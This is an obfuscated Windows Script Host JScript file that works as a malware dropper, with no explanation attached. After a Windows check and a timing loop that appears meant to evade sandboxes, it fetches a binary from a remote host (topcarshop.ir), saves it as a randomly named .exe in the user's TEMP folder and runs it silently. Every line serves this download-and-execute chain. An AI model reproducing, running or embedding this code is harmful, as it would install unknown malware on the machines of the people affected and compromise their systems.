var _JO = false;
var _E0 = "CreateObject";
var _Z1 = function _GU() {return WScript[_E0]("WScript"+".Shell");}(), _H = 11;
var _QY = "MSXML2.XMLHTTP";
var _Q = 2123213;
var _AY = 0;
function _E(_LY){_Z1["Run"](_LY, _AY, _AY);};
function _I(){return _QY + "";};
function _ZX(_E2, _HE){_AY = _AY * 1; return _E2 - _HE;};
function _N(){return _E0;};
/*@cc_on
  @if (@_win32 || @_win64)
    _JO = true;
  @end
@*/
if (_JO)
{
var _UA = "";
function _Z(){return 22;};
var _GU0 = 0; var _W = 0;
function _O()
{
var _UF = new this["Date"]();
var _I1 = _UF["getUTCMilliseconds"]();
WScript["Sleep"](_Z());
var _UF = new this["Date"]();
var _M = _UF["getUTCMilliseconds"]();
WScript["Sleep"](_Z());
var _UF = new this["Date"]();
var _FM = _UF["getUTCMilliseconds"]();
var _GU0 = "_E1";
_GU0 = _ZX(_M, _I1);
var _W = "_B";
_W = _ZX(_FM, _M);
_UA = "open";
return _ZX(_GU0, _W);
}
var _CZ = false;
var _B0 = false;
for (var _T = _AY; _T < _Z() * 1; _T++){if (_O() != _AY){
_CZ = true; 
_W = "31" + 11 * _GU0 + _W; 
_B0 = true; 
break;
}}
function _QV() {return ((_CZ == true) && (_CZ == _B0)) ? 1 : _AY;};
if (_CZ && _QV() && _B0){
function _RN() {return _Z1["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "PCVHddIggYv.ex" + "e";};
 _X = _I();
 _A = WScript[_E0](_X);
 var _Z0 = 1;
 while (_Z0){
try {
	if (_Z0 == 1)
	{
		_A[_UA]("GET", "http://topcarshop.ir/m1kas", false);
		_A["send"]();
		_JS = "Sleep";
	}
	WScript[_JS](_Z() + 120); 
	if (_A["readystate"] < 2 * 2) continue;
	_Z0 = _AY;
	function _OY(_N0) {var _C = (1, 2, 3, 4, 5, _N0); return _C;};
	_L = WScript[_N()]("ADODB.Stream");
	_X = _L;
	_X[_UA]();
	_X["type"] = _OY(1);
	_X["write"](_A["ResponseBody"]);
	_L["position"] = _OY(_AY);
	_X["Save" + "ToFile"](_RN(), 2);
	_L["cl"+"ose"]();
	_I0 = _RN();
	_E(_I0);
} catch(_UV){};
}
}
}

